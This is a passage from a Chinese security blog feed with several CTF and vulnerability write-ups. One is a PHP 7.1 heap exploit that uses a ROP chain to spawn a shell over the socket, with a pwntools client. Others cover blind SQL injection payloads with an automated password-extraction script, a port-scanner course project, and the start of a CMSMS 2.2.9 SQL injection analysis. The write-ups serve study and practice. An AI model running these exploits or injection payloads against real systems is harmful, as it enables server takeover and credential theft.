title="php2.0"></a>php2.0</h2><p>源码和2.5相同，不过php环境为7.1</p><p>参考链接：<a href="https://ctftime.org/writeup/16665" target="_blank" rel="noopener">https://ctftime.org/writeup/16665</a></p><p>本地测试</p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">/*</span><span class="hljs-comment"></span><span class="hljs-comment">This exploit works only on a specific php7.1 build for Ubuntu 16.04.</span><span class="hljs-comment">(php 7.1.32-1+ubuntu16.04.1+deb.sury.org+1 + apache2)</span><span class="hljs-comment"></span><span class="hljs-comment">1. Install php7.1:</span><span class="hljs-comment">    sudo add-apt-repository ppa:ondrej/php</span><span class="hljs-comment">    sudo apt install php7.1 libapache2-mod-php7.1</span><span class="hljs-comment"></span><span class="hljs-comment">2. Save this file as /var/www/html/pwn.php.</span><span class="hljs-comment"></span><span class="hljs-comment">3. Get an interactive shell with pwntools:</span><span class="hljs-comment"></span><span class="hljs-comment">    from pwn import *</span><span class="hljs-comment">    s = remote('localhost', 80)</span><span class="hljs-comment">    p = 'GET /pwn.php HTTP/1.1\r\n'</span><span class="hljs-comment">    p += 'Host: localhost\r\n\r\n'</span><span class="hljs-comment">    s.send(p)</span><span class="hljs-comment">    s.interactive()</span><span class="hljs-comment"></span><span class="hljs-comment">*/</span>define(<span class="hljs-string">'SOCK_FD'</span>, <span class="hljs-number">11</span>); <span class="hljs-comment"># client &lt;-&gt; server fd</span>define(<span class="hljs-string">'POP_RDI'</span>, <span class="hljs-number">0xd14eb</span>);define(<span class="hljs-string">'POP_RSI'</span>, <span class="hljs-number">0xd157f</span>);define(<span class="hljs-string">'POP_RDX'</span>, <span class="hljs-number">0xd5033</span>);define(<span class="hljs-string">'POP_RCX'</span>, <span class="hljs-number">0xff87a</span>);define(<span class="hljs-string">'SYSCALL_PLT'</span>, <span class="hljs-number">0xcf800</span>);define(<span class="hljs-string">'BIN_SH'</span>, <span class="hljs-number">0x33bb9e</span>);define(<span class="hljs-string">'STACK_PIVOT'</span>, <span class="hljs-number">0xd1577</span>); <span class="hljs-comment"># push rdi ; ... ; pop rsp ; pop r13 ; pop r14 ; ret</span>define(<span class="hljs-string">'ZEND_OBJECTS_DESTROY_OBJECT'</span>, <span class="hljs-number">0x2952d0</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MySplFixedArray</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SplFixedArray</span> </span>&#123; &#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Z</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">JsonSerializable</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rebase</span><span class="hljs-params">($addr)</span> </span>&#123;        <span class="hljs-keyword">global</span> $pie;        <span class="hljs-keyword">return</span> $pie + $addr;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span><span class="hljs-params">(&amp;$str, $p, $v, $n = <span class="hljs-number">8</span>)</span> </span>&#123;      $i = <span class="hljs-number">0</span>;      <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; $n; $i++) &#123;        $str[$p + $i] = chr($v &amp; <span class="hljs-number">0xff</span>);        $v &gt;&gt;= <span class="hljs-number">8</span>;      &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span><span class="hljs-params">(&amp;$str, $p, $s=<span class="hljs-number">8</span>)</span> </span>&#123;        $address = <span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span>($j = $s<span class="hljs-number">-1</span>; $j &gt;= <span class="hljs-number">0</span>; $j--) &#123;            $address &lt;&lt;= <span class="hljs-number">8</span>;            $address |= ord($str[$p+$j]);        &#125;        <span class="hljs-keyword">return</span> $address;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span><span class="hljs-params">($ptr, $m=<span class="hljs-number">8</span>)</span> </span>&#123;        $out = <span class="hljs-string">""</span>;        <span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>; $i &lt; $m; $i++) &#123;            $out .= chr($ptr &amp; <span class="hljs-number">0xff</span>);            $ptr &gt;&gt;= <span class="hljs-number">8</span>;        &#125;        <span class="hljs-keyword">return</span> $out;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rop</span><span class="hljs-params">($addr)</span> </span>&#123;        <span class="hljs-keyword">global</span> $ctr;        <span class="hljs-comment"># rop starts at abc + 0x1010</span>        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x1010</span> + $ctr * <span class="hljs-number">8</span>, $addr);        $ctr += <span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">syscall</span><span class="hljs-params">($syscall_no, $rdi=<span class="hljs-number">0</span>, $rsi=<span class="hljs-number">0</span>, $rdx=<span class="hljs-number">0</span>)</span> </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;rop(<span class="hljs-keyword">$this</span>-&gt;rebase(POP_RDI));        <span class="hljs-keyword">$this</span>-&gt;rop($syscall_no);        <span class="hljs-keyword">$this</span>-&gt;rop(<span class="hljs-keyword">$this</span>-&gt;rebase(POP_RSI));        <span class="hljs-keyword">$this</span>-&gt;rop($rdi);        <span class="hljs-keyword">$this</span>-&gt;rop(<span class="hljs-keyword">$this</span>-&gt;rebase(POP_RDX));        <span class="hljs-keyword">$this</span>-&gt;rop($rsi);        <span class="hljs-keyword">$this</span>-&gt;rop(<span class="hljs-keyword">$this</span>-&gt;rebase(POP_RCX));        <span class="hljs-keyword">$this</span>-&gt;rop($rdx);        <span class="hljs-keyword">$this</span>-&gt;rop(<span class="hljs-keyword">$this</span>-&gt;rebase(SYSCALL_PLT));    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jsonSerialize</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">global</span> $y, $pie, $ctr;        $contiguous = [];        <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i &lt; <span class="hljs-number">10</span>; $i++)            $contiguous[] = <span class="hljs-keyword">new</span> DateInterval(<span class="hljs-string">'PT1S'</span>);        $room = [];        <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i &lt; <span class="hljs-number">10</span>;$i++)            $room[] = <span class="hljs-keyword">new</span> Z();        $_protector = <span class="hljs-keyword">$this</span>-&gt;ptr2str(<span class="hljs-number">0</span>, <span class="hljs-number">78</span>);        <span class="hljs-keyword">$this</span>-&gt;abc = <span class="hljs-keyword">$this</span>-&gt;ptr2str(<span class="hljs-number">0</span>, <span class="hljs-number">79</span>);        $p = <span class="hljs-keyword">new</span> DateInterval(<span class="hljs-string">'PT1S'</span>);        <span class="hljs-keyword">unset</span>($y[<span class="hljs-number">0</span>]);        <span class="hljs-keyword">unset</span>($p);        $protector = <span class="hljs-string">".$_protector"</span>;        $x = <span class="hljs-keyword">new</span> DateInterval(<span class="hljs-string">'PT1S'</span>);        $x-&gt;d = <span class="hljs-number">0x2000</span>; <span class="hljs-comment"># $this-&gt;abc is now of size 0x2000</span>          $spl1 = <span class="hljs-keyword">new</span> MySplFixedArray();        $spl2 = <span class="hljs-keyword">new</span> MySplFixedArray();        <span class="hljs-comment"># some leaks</span>        $class_entry = <span class="hljs-keyword">$this</span>-&gt;str2ptr(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x120</span>);        $handlers = <span class="hljs-keyword">$this</span>-&gt;str2ptr(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x128</span>);        $php_heap = <span class="hljs-keyword">$this</span>-&gt;str2ptr(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x1a8</span>);        $abc_addr = $php_heap - <span class="hljs-number">0x218</span>;        <span class="hljs-comment"># pie leak</span>        $fake_obj = $abc_addr + <span class="hljs-number">0x60</span>;        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x68</span>, $handlers - <span class="hljs-number">0x10</span>);        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x120</span>, $fake_obj);        $pie = <span class="hljs-keyword">$this</span>-&gt;str2ptr(get_class($spl1), <span class="hljs-number">8</span>) - ZEND_OBJECTS_DESTROY_OBJECT;        <span class="hljs-comment"># write rop</span>        <span class="hljs-keyword">$this</span>-&gt;syscall(<span class="hljs-number">33</span>, SOCK_FD, <span class="hljs-number">1</span>); <span class="hljs-comment"># dup2</span>        <span class="hljs-keyword">$this</span>-&gt;syscall(<span class="hljs-number">33</span>, SOCK_FD, <span class="hljs-number">0</span>); <span class="hljs-comment"># dup2</span>        <span class="hljs-keyword">$this</span>-&gt;syscall(<span class="hljs-number">59</span>, <span class="hljs-keyword">$this</span>-&gt;rebase(BIN_SH)); <span class="hljs-comment"># execve</span>        <span class="hljs-keyword">$this</span>-&gt;syscall(<span class="hljs-number">60</span>, <span class="hljs-number">0</span>); <span class="hljs-comment"># exit</span>        <span class="hljs-comment"># overwrite next chunk forward pointer</span>        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x1a8</span>, $class_entry + <span class="hljs-number">0x20</span>);        <span class="hljs-comment"># allocate some strings</span>        $x = str_repeat(<span class="hljs-string">"X"</span>, <span class="hljs-number">69</span>);        $y = str_repeat(<span class="hljs-string">"Y"</span>, <span class="hljs-number">69</span>);        $z = str_repeat(<span class="hljs-string">"Z"</span>, <span class="hljs-number">69</span>);        <span class="hljs-comment"># $z is now at $class_entry + 0x20</span>        <span class="hljs-comment"># restore a pointer to some writable addr</span>        <span class="hljs-keyword">$this</span>-&gt;write($z, <span class="hljs-number">0</span>, $abc_addr);         <span class="hljs-comment"># overwrite a function destructor</span>        <span class="hljs-keyword">$this</span>-&gt;write($z, <span class="hljs-number">0x18</span>, $abc_addr + <span class="hljs-number">0x1000</span>); <span class="hljs-comment"># -&gt; rdi</span>        <span class="hljs-keyword">$this</span>-&gt;write($z, <span class="hljs-number">0x38</span>, <span class="hljs-keyword">$this</span>-&gt;rebase(STACK_PIVOT)); <span class="hljs-comment"># -&gt; rip</span>        <span class="hljs-keyword">exit</span>();    &#125;&#125;<span class="hljs-keyword">if</span>(php_sapi_name() != <span class="hljs-string">'apache2handler'</span> ||    phpversion() != <span class="hljs-string">'7.1.32-1+ubuntu16.04.1+deb.sury.org+1'</span>) &#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">'Wrong setup.'</span>);&#125;<span class="hljs-keyword">global</span> $y;$y = [<span class="hljs-keyword">new</span> Z()];json_encode([<span class="hljs-number">0</span> =&gt; &amp;$y]);</code></pre><ol><li><p>上传该php文件到服务器</p></li><li><p>本地执行</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *s = remote(<span class="hljs-string">'localhost'</span>, <span class="hljs-number">80</span>)p = <span class="hljs-string">'GET /pwn.php HTTP/1.1\r\n'</span>p += <span class="hljs-string">'Host: localhost\r\n\r\n'</span>s.send(p)s.interactive()</code></pre></li><li><p>执行环境必须是<code>php 7.1.32-1+ubuntu16.04.1+deb.sury.org+1 + apache2</code></p><p><img src="./1569483833588.png" srcset="/img/loading.gif" alt="1569483833588"></p></li><li><p>py执行结果</p><p>   <img src="./1569483928690.png" srcset="/img/loading.gif" alt="1569483928690"></p></li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://fireshellsecurity.team/inctf2019-php1-php15-php25/" target="_blank" rel="noopener">https://fireshellsecurity.team/inctf2019-php1-php15-php25/</a></p><p><a href="https://ctftime.org/writeup/16595" target="_blank" rel="noopener">https://ctftime.org/writeup/16595</a></p><h1 id="特性总结"><a href="#特性总结" class="headerlink" title="特性总结"></a>特性总结</h1><ol><li>php 对于ascii 0x7f默认为字符串</li><li>eval、echo为语言结构不是函数</li><li>eval的特性：只能执行一次代码</li><li>rce参考一些常见的webshell思路</li><li>_()为gettext()的别名</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>课程设计 | fafuscan</title>
    <link href="/2019/09/22/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1-fafuscan/"/>
    <url>/2019/09/22/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1-fafuscan/</url>
    
    <content type="html"><![CDATA[<p><img src="./1.png" srcset="/img/loading.gif" alt=""></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>项目地址：<a href="https://github.com/zhzhdoai/fafuscan.git" target="_blank" rel="noopener">https://github.com/zhzhdoai/fafuscan.git</a><br>网络课程设计我选择了端口扫描器，算是练习巩固python编程。比不上世面高端扫描器，毕竟是自己的工具，多多少少有点小成就感.</p></blockquote><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><blockquote><p>在编写脚本时，前前后后改了三版。第一版本使用单线程进行，但发现在进行网段大规模扫描时候余力不足。第二版本学习了多线程，进行编写，但是前期将各个功能进行冗杂在一个文件中没有很好的扩展性。下方的目录就是第三版的成功，module.py放置功能文件，dict目录放置web扫描字符，cmdScan.py主程序调配方法，common.py通用方法，config.py配置文件。</p></blockquote><h1 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h1><p><img src="./9.png" srcset="/img/loading.gif" alt=""></p><h1 id="主机存活、端口扫描"><a href="#主机存活、端口扫描" class="headerlink" title="主机存活、端口扫描"></a>主机存活、端口扫描</h1><h2 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h2><p><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><p><img src="./5.png" srcset="/img/loading.gif" alt=""></p><h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><h2 id="关键代码-1"><a href="#关键代码-1" class="headerlink" title="关键代码"></a>关键代码</h2><p><img src="./3.png" srcset="/img/loading.gif" alt=""></p><h2 id="效果展示-1"><a href="#效果展示-1" class="headerlink" title="效果展示"></a>效果展示</h2><p><img src="./6.png" srcset="/img/loading.gif" alt=""></p><h1 id="参数提取"><a href="#参数提取" class="headerlink" title="参数提取"></a>参数提取</h1><h2 id="关键代码-2"><a href="#关键代码-2" class="headerlink" title="关键代码"></a>关键代码</h2><p><img src="./4.png" srcset="/img/loading.gif" alt=""></p><h2 id="效果展示-2"><a href="#效果展示-2" class="headerlink" title="效果展示"></a>效果展示</h2><p><img src="./7.png" srcset="/img/loading.gif" alt=""></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>[1] 手把手教你制作信息收集器之端口扫描<br><a href="https://www.freebuf.com/column/158936.html" target="_blank" rel="noopener">https://www.freebuf.com/column/158936.html</a><br>[2] python使用socket实现多线程端口扫描<br><a href="https://blog.csdn.net/comprel/article/details/72825562" target="_blank" rel="noopener">https://blog.csdn.net/comprel/article/details/72825562</a><br>[3] Web漏洞扫描器的设计与实现（一）<br><a href="https://www.freebuf.com/column/192332.html" target="_blank" rel="noopener">https://www.freebuf.com/column/192332.html</a><br>[4] Python黑客]Python手把手教你打造自己的多线程批量工具<br><a href="https://bbs.ichunqiu.com/thread-31814-1-1.html?from=beef" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-31814-1-1.html?from=beef</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数字经济云安全公测大赛Inject4fun题解 </title>
    <link href="/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/"/>
    <url>/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="Inject4Fun"><a href="#Inject4Fun" class="headerlink" title="Inject4Fun"></a>Inject4Fun</h1><p>login.html</p><p><img src="./1568977270946.png" srcset="/img/loading.gif" alt="1568977270946"></p><p>js代码</p><p><img src="./1568977314794.png" srcset="/img/loading.gif" alt="1568977314794"></p><p>提示注入，过滤以下字符</p><pre><code class="hljs bash">or、and、&amp;&amp;、||、ord、ascii、like、select、union....</code></pre><p>可以构造如下语句,注入类型布尔盲注</p><pre><code class="hljs sql">1'^(length(database())=4)^'1   长度3false =&gt; 显示：wrong password  true=&gt; 显示：wrong user</code></pre><p>由于过滤了select不直接能去注其他表，也不存在堆叠注入。学长抠着鼻屎说可能字段只存在一列。所以我们开始手注入……</p><p>刚开始思路是通过python js2py执行js带到后端，但是发现这js也太多了。或者逆出加密，用py语言执行。还有就是selenium模块模拟人手动操作浏览器。但发现自己开发太菜了，脚本报错一大堆，折腾一下午，最后和学长一起手工盲注.</p><pre><code class="hljs php"><span class="hljs-number">1</span><span class="hljs-string">'^(substr(username,1,1)='</span>A<span class="hljs-string">')^'</span><span class="hljs-number">1</span>  =&gt; Admin<span class="hljs-number">1</span><span class="hljs-string">'^(substr(password,1,1)='</span>A<span class="hljs-string">')^'</span><span class="hljs-number">1</span>  =&gt; e6f1567e3698c06b9eb17b0e8e77444e</code></pre><p><img src="./1568977839299.png" srcset="/img/loading.gif" alt="1568977839299"></p><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p><img src="./1568977921802.png" srcset="/img/loading.gif" alt="1568977921802"></p><h2 id="解法二-wp"><a href="#解法二-wp" class="headerlink" title="解法二(wp)"></a>解法二(wp)</h2><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">randomPassword</span>(<span class="hljs-params">size</span>)</span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">var</span> seed = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-string">'A'</span>,<span class="hljs-string">'B'</span>,<span class="hljs-string">'C'</span>,<span class="hljs-string">'D'</span>,<span class="hljs-string">'E'</span>,<span class="hljs-string">'F'</span>,<span class="hljs-string">'G'</span>,<span class="hljs-string">'H'</span>,<span class="hljs-string">'I'</span>,<span class="hljs-string">'J'</span>,<span class="hljs-string">'K'</span>,<span class="hljs-string">'L'</span>,<span class="hljs-string">'M'</span>,<span class="hljs-string">'N'</span>,<span class="hljs-string">'P'</span>,<span class="hljs-string">'Q'</span>,<span class="hljs-string">'R'</span>,<span class="hljs-string">'S'</span>,<span class="hljs-string">'T'</span>,<span class="hljs-string">'U'</span>,<span class="hljs-string">'V'</span>,<span class="hljs-string">'W'</span>,<span class="hljs-string">'X'</span>,<span class="hljs-string">'Y'</span>,<span class="hljs-string">'Z'</span>,  <span class="hljs-string">'a'</span>,<span class="hljs-string">'b'</span>,<span class="hljs-string">'c'</span>,<span class="hljs-string">'d'</span>,<span class="hljs-string">'e'</span>,<span class="hljs-string">'f'</span>,<span class="hljs-string">'g'</span>,<span class="hljs-string">'h'</span>,<span class="hljs-string">'i'</span>,<span class="hljs-string">'j'</span>,<span class="hljs-string">'k'</span>,<span class="hljs-string">'m'</span>,<span class="hljs-string">'n'</span>,<span class="hljs-string">'p'</span>,<span class="hljs-string">'Q'</span>,<span class="hljs-string">'r'</span>,<span class="hljs-string">'s'</span>,<span class="hljs-string">'t'</span>,<span class="hljs-string">'u'</span>,<span class="hljs-string">'v'</span>,<span class="hljs-string">'w'</span>,<span class="hljs-string">'x'</span>,<span class="hljs-string">'y'</span>,<span class="hljs-string">'z'</span>,  <span class="hljs-string">'2'</span>,<span class="hljs-string">'3'</span>,<span class="hljs-string">'4'</span>,<span class="hljs-string">'5'</span>,<span class="hljs-string">'6'</span>,<span class="hljs-string">'7'</span>,<span class="hljs-string">'8'</span>,<span class="hljs-string">'9'</span>  );  seedlength = seed.length;  <span class="hljs-keyword">var</span> createPassword = <span class="hljs-string">''</span>;  <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;size;i++) &#123;    j = <span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random()*seedlength);    createPassword += seed[j];  &#125;  <span class="hljs-keyword">return</span> createPassword;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params">username, password</span>)</span>&#123;    <span class="hljs-keyword">var</span> a = randomPassword(<span class="hljs-number">16</span>);    <span class="hljs-keyword">var</span> key = CryptoJS.enc.Latin1.parse(a);            <span class="hljs-keyword">var</span> iv =    CryptoJS.enc.Latin1.parse(<span class="hljs-string">'1234567890123456'</span>);                <span class="hljs-keyword">var</span> data1 = username;         <span class="hljs-keyword">var</span> encrypted1 = CryptoJS.AES.encrypt(data1, key, &#123; <span class="hljs-attr">iv</span>: iv, <span class="hljs-attr">mode</span>: CryptoJS.mode.CBC, <span class="hljs-attr">padding</span>: CryptoJS.pad.ZeroPadding &#125;);    <span class="hljs-keyword">var</span> data2 = password;    <span class="hljs-keyword">var</span> encrypted2 = CryptoJS.AES.encrypt(data2, key, &#123; <span class="hljs-attr">iv</span>: iv, <span class="hljs-attr">mode</span>: CryptoJS.mode.CBC, <span class="hljs-attr">padding</span>: CryptoJS.pad.ZeroPadding &#125;);    $(<span class="hljs-string">'#username'</span>).val(encrypted1);    $(<span class="hljs-string">'#password'</span>).val(encrypted2);    <span class="hljs-keyword">var</span> password = $(<span class="hljs-string">'#password'</span>).val();    <span class="hljs-keyword">var</span> username = $(<span class="hljs-string">'#username'</span>).val();    <span class="hljs-keyword">var</span> rsa = <span class="hljs-keyword">new</span> RSAKey();    <span class="hljs-keyword">var</span> modulus = <span class="hljs-string">"CDB41B014C244A55CEC3E9D222B22C8A05A7DD7DF8A419A2A9C08E91DF725A1FD4C09777F36D394701C5DB97CCFC52FFBD5A90329295F5CEBBB89986BAAFAE4FE58A1F3ECFC39A7B960F5697632CE9D2FAA787F36D9CF5F4FE59DBB52E0554CC4B510D87AB72EB80D36A61E8B9AD00F37720578986E5F17AB0387754566F4E2B"</span>;    <span class="hljs-keyword">var</span> exponent = <span class="hljs-string">"010001"</span>;    rsa.setPublic(modulus, exponent);    <span class="hljs-keyword">var</span> res = rsa.encrypt(a);      <span class="hljs-keyword">return</span> [username, password, res]&#125;<span class="hljs-comment">// wrong password</span><span class="hljs-comment">// wrong user</span><span class="hljs-keyword">var</span> password = <span class="hljs-string">''</span>;<span class="hljs-keyword">var</span> strings = <span class="hljs-string">'abcdefghijklmnopqrstuvwxyz0123456789'</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_password</span>(<span class="hljs-params">i, j</span>) </span>&#123;    <span class="hljs-keyword">if</span>(i &gt; <span class="hljs-number">32</span> || j &gt; <span class="hljs-number">36</span>) <span class="hljs-keyword">return</span>;    <span class="hljs-keyword">var</span> x =  strings[j];    <span class="hljs-keyword">var</span> username = <span class="hljs-string">"' ^ (substr(password,"</span> + i +<span class="hljs-string">",1)='"</span> +x+<span class="hljs-string">"') ^ '1"</span>;    res = encode(username, <span class="hljs-string">'admin'</span>);    $.ajax(&#123;       type:<span class="hljs-string">"post"</span>,       url:<span class="hljs-string">"login.php"</span>,       data: &#123;<span class="hljs-attr">username</span>:res[<span class="hljs-number">0</span>], <span class="hljs-attr">password</span>:res[<span class="hljs-number">1</span>], <span class="hljs-attr">code</span>:res[<span class="hljs-number">2</span>]&#125;,       dataType: <span class="hljs-string">'text'</span>,       <span class="hljs-keyword">async</span> : <span class="hljs-literal">false</span>,      success:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">result</span>)</span>&#123;         <span class="hljs-keyword">if</span>(result == <span class="hljs-string">'wrong user'</span>) &#123;          <span class="hljs-comment">// console.log(result);</span>          get_password(i, ++j);        &#125; <span class="hljs-keyword">else</span> &#123;          password += x;          <span class="hljs-built_in">console</span>.log(password);          get_password(++i, <span class="hljs-number">0</span>);        &#125;      &#125;     &#125;);&#125;get_password(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>);</code></pre><p>参考链接：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247486013&amp;idx=1&amp;sn=958eefc7f96217e85b634a9a3445d869&amp;chksm=e89e22e5dfe9abf3f246a719ebca8192e94d94f64b722132eab5f3bdebf549c50a1fdfac3d77&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1569114886780&amp;sharer_shareid=a4ed4d8d3b949604b1b6383586a26b41#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247486013&amp;idx=1&amp;sn=958eefc7f96217e85b634a9a3445d869&amp;chksm=e89e22e5dfe9abf3f246a719ebca8192e94d94f64b722132eab5f3bdebf549c50a1fdfac3d77&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1569114886780&amp;sharer_shareid=a4ed4d8d3b949604b1b6383586a26b41#rd</a></p><p><img src="./1569118726156.png" srcset="/img/loading.gif" alt="1569118726156"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h1 id="ewum"><a href="#ewum" class="headerlink" title="ewum"></a>ewum</h1><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><span class="hljs-keyword">import</span> os<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Imagepath = <span class="hljs-string">"/home/osword/Downloads/big/"</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_file_list</span><span class="hljs-params">(file_path)</span>:</span>    dir_list = os.listdir(file_path)    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> dir_list:        <span class="hljs-keyword">return</span>    <span class="hljs-keyword">else</span>:        dir_list = sorted(dir_list, key=<span class="hljs-keyword">lambda</span> x: os.path.getmtime(os.path.join(file_path, x)))        <span class="hljs-comment"># print(dir_list)</span>        <span class="hljs-keyword">return</span> dir_listlist_im = get_file_list(path)column = <span class="hljs-number">16</span>row_num = <span class="hljs-number">6</span>width = <span class="hljs-number">51</span>height = <span class="hljs-number">51</span>imgs = [Image.open(path+i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> list_im]target = Image.new(<span class="hljs-string">'RGB'</span>, (width*column, height*row_num))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(list_im)):    <span class="hljs-keyword">if</span> i % column == <span class="hljs-number">0</span>:        end = len(list_im) <span class="hljs-keyword">if</span> i + column &gt; len(list_im) <span class="hljs-keyword">else</span> i + column        <span class="hljs-keyword">for</span> col, image <span class="hljs-keyword">in</span> enumerate(imgs[i:i+column]):            target.paste(image, (width*col, height*(i//column),width*(col + <span class="hljs-number">1</span>), height*(i//column + <span class="hljs-number">1</span>)))target.show()</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cmsms_2.2.9前台sql注入(复现)</title>
    <link href="/2019/09/17/Cmsms-2-2-9%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5-%E5%A4%8D%E7%8E%B0/"/>
    <url>/2019/09/17/Cmsms-2-2-9%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5-%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><ol><li>没有对sql语句进行过滤</li><li>unset操作绕过对字符串的强制类型操作</li></ol><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>class.CMS_Content_Block.php，第237行执行对传入的mact参数进行拆分</p><p>$modulename=”news”、$action=”default”</p><p><img src="./cmcms%3C=2.2.9sql%E6%B3%A8%E5%85%A5.assets/1568723417461.png" srcset="/img/loading.gif" alt="1568723417461"></p><p>class.CMS_Content_Block.php第289行GetModuleParameters方法 ，解析传入的参数，注册变量，并未做任何过滤，$key值在不为’id’、’returnid’将直接以字符串的形式传递到$param数组中。$param[‘idlist’]=”0,1)) and sleep(9) –”</p><p><img src="./cmcms%3C=2.2.9sql%E6%B3%A8%E5%85%A5.assets/1568723447621.png" srcset="/img/loading.gif" alt="1568723447621"></p><p>继续跟进代码，代码进入第295行DoAtionBase方法，第1481行执行模块中的方法.</p><p>将$name=’default’拼接至文件名中，第1405行include之. </p><p>$filename=’’/var/www/html/cms/cmsms-2.2.9-install/modules/News/action.default.php’</p><p><img src="./cmcms%3C=2.2.9sql%E6%B3%A8%E5%85%A5.assets/1568723276614.png" srcset="/img/loading.gif" 